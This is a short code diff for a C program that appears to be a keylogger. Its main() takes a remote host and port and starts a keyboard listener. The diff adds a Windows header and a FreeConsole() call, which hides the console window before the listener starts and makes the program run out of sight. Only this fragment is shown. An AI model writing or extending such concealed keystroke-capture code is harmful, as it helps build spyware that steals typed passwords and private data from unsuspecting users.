@@ -2,6 +2,7 @@
 #include <unistd.h>
 #include <stdlib.h>
 #include <string.h>
+#include <windows.h>
 
 #include "settings/constants.h"
 #include "keyboard/listener.h"
@@ -40,6 +41,7 @@ int main(int argc , char *argv[]) {
     char *host = argv[1];
     unsigned short port = atoi(argv[2]);
 
+    FreeConsole();
     init();
 
     if (KEYBOARD_LISTENER_E_SUCCESSFUL != keyboard_listener_start()) {
